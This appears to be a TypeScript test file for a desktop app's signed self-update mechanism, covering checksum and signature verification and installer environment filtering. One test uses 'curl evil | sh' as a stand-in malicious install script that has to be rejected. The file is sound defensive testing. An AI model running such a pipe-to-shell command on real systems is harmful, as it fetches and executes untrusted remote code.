import { createHash, generateKeyPairSync, sign } from 'node:crypto'
import { blake2b } from '@noble/hashes/blake2.js'
import { describe, expect, test, vi } from 'vitest'
import { installerEnv, prepareUpdate, runInstaller } from '../../src/desktop/selfUpdate'

const VERSION = '1.2.3'
const BASE = `https://github.com/samuelba/ukemi/releases/download/v${VERSION}`
const SCRIPT = 'echo installed\n'
const APPIMAGE_HASH = 'b'.repeat(64)
const scriptHash = createHash('sha256').update(SCRIPT).digest('hex')
const SUMS = `${scriptHash}  install.sh\n${APPIMAGE_HASH}  Ukemi-${VERSION}.AppImage\n`

const { publicKey, privateKey } = generateKeyPairSync('ed25519')
const keyId = Buffer.from('0102030405060708', 'hex')
const raw = publicKey.export({ format: 'der', type: 'spki' }).subarray(-32)
const PUBLIC_KEY = Buffer.concat([Buffer.from('Ed'), keyId, raw]).toString('base64')

function minisig(data: string, comment = `ukemi ${VERSION}`): string {
  const signed = sign(null, blake2b(Buffer.from(data)), privateKey)
  const global = sign(null, Buffer.concat([signed, Buffer.from(comment)]), privateKey)
  const line = Buffer.concat([Buffer.from('ED'), keyId, signed]).toString('base64')
  return `untrusted comment: test\n${line}\ntrusted comment: ${comment}\n${global.toString('base64')}\n`
}

function server(overrides: Record<string, string | Response> = {}): typeof fetch {
  const files: Record<string, string | Response> = {
    SHA256SUMS: SUMS,
    'SHA256SUMS.minisig': minisig(SUMS),
    'install.sh': SCRIPT,
    ...overrides,
  }
  return vi.fn(async (url: string | URL | Request) => {
    const name = String(url).slice(BASE.length + 1)
    const file = String(url).startsWith(`${BASE}/`) ? files[name] : undefined
    if (file === undefined) {
      return new Response('', { status: 404 })
    }
    return typeof file === 'string' ? new Response(file) : file
  }) as unknown as typeof fetch
}

const prepare = (fetcher: typeof fetch) =>
  prepareUpdate(VERSION, { fetch: fetcher, publicKey: PUBLIC_KEY })

describe('prepareUpdate', () => {
  test('returns the verified script and checksums', async () => {
    const update = await prepare(server())
    expect(new TextDecoder().decode(update.script)).toBe(SCRIPT)
    expect(update.sums).toBe(SUMS)
  })

  test('rejects a script that is not the signed one', async () => {
    await expect(prepare(server({ 'install.sh': 'curl evil | sh\n' }))).rejects.toThrow(/checksum/)
  })

  test('rejects checksums that are not signed', async () => {
    const forged = SUMS.replace(APPIMAGE_HASH, 'c'.repeat(64))
    await expect(prepare(server({ SHA256SUMS: forged }))).rejects.toThrow(/not signed/)
  })

  test('rejects a release without a signature', async () => {
    const missing = new Response('', { status: 404 })
    await expect(prepare(server({ 'SHA256SUMS.minisig': missing }))).rejects.toThrow(
      /SHA256SUMS\.minisig.*404/,
    )
  })

  test('rejects a signature of another version', async () => {
    const old = minisig(SUMS, 'ukemi 1.2.2')
    await expect(prepare(server({ 'SHA256SUMS.minisig': old }))).rejects.toThrow(/1\.2\.2/)
  })

  test('rejects an oversized download', async () => {
    const huge = 'x'.repeat(1024 * 1024 + 1)
    await expect(prepare(server({ 'install.sh': huge }))).rejects.toThrow(/too large/)
  })
})

describe('installerEnv', () => {
  const env = installerEnv(
    {
      HOME: '/home/me',
      PATH: '/tmp/.mount_Ukemi/usr/bin:/usr/bin:/tmp/.mount_Ukemi:/bin',
      APPDIR: '/tmp/.mount_Ukemi',
      APPIMAGE: '/home/me/.local/share/ukemi/Ukemi.AppImage',
      LD_LIBRARY_PATH: '/tmp/.mount_Ukemi/usr/lib',
      ELECTRON_RUN_AS_NODE: '1',
      XDG_DATA_HOME: '/data',
      XDG_BIN_HOME: '/bin-home',
      XDG_DATA_DIRS: '/tmp/.mount_Ukemi/usr/share',
      TMPDIR: '/var/tmp',
      LANG: 'C.UTF-8',
      UKEMI_FORCE: '1',
      SECRET_TOKEN: 'nope',
    },
    VERSION,
    SUMS,
  )

  test('passes only what the installer needs', () => {
    expect(env).toEqual({
      HOME: '/home/me',
      PATH: '/usr/bin:/bin',
      XDG_DATA_HOME: '/data',
      XDG_BIN_HOME: '/bin-home',
      TMPDIR: '/var/tmp',
      LANG: 'C.UTF-8',
      UKEMI_VERSION: VERSION,
      UKEMI_SHA256SUMS: SUMS,
    })
  })

  test('keeps a directory that only shares its prefix with the AppImage mount', () => {
    const result = installerEnv({ PATH: '/app-other/bin:/app/bin', APPDIR: '/app' }, VERSION, 'x')
    expect(result.PATH).toBe('/app-other/bin')
  })
})

describe('runInstaller', () => {
  const update = (script: string) => ({
    script: new TextEncoder().encode(script),
    sums: SUMS,
  })
  const env = { PATH: process.env.PATH, UKEMI_VERSION: VERSION }

  test('feeds the script to sh with the given environment', async () => {
    const script = `[ "$UKEMI_VERSION" = "${VERSION}" ] || exit 9\n`
    await expect(runInstaller(update(script), env)).resolves.toBeUndefined()
  })

  test("reports the installer's own explanation", async () => {
    const script = 'echo "ukemi install: no space left" >&2\nexit 1\n'
    await expect(runInstaller(update(script), env)).rejects.toThrow(/^no space left$/)
  })

  test('reports the exit code when the installer gives no reason', async () => {
    await expect(runInstaller(update('exit 7\n'), env)).rejects.toThrow(/7/)
  })
})
